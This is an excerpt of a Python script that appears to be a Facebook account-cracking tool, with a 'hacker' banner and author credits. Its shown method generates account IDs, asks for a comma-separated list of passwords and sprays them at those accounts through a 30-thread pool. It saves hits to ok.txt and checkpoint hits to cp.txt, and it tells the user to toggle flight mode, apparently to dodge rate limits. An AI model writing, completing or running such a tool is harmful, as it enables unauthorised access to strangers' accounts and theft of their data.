...
class Main:
	def __init__(self):
		...
		os.system("clear")
		print("  ______        \n | ___ \        \n | |_/ /__ _ _ __   __ _          \n |    // _` | '_ \ / _` | \033[0;96mHacker\033[0;97m        \n | |\ \ (_| | | | | (_| |\033[0;96m  Brand\033[0;97m_\n \_| \_\__,_|_| |_|\__,_|")
		print(" [*] Author  : Rana Nadeem Rajput") 
		print(" [*] Team      : Annos Abdullah,Rishu,Rdj,\n")
		print(" [*] GitHub  : https://github.com/Rananadeem5214") 
	...
	def fbbaru(self):
		...
		xx = 77777777777
		idx = "1000" 
		limit = int(input(" [+] Set Limit Out Of (5000): "))
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [!] Set password , (koma) for Example : 123456,123456789")
				listpass = input(" [?] Type Password : ")
				if len(listpass)<=5:
					exit("\n [!] Password must be 6 digit minimum")
				print(" [*] Crack This password List -> [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n [+] Ok Idz Saved -> ok.txt")
				print(" [+] Cp Idz Saved -> cp.txt")
				print(" [!] turn on flight mode for 5 secconds\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [#] crack Complete For Back type python2 run.py...")
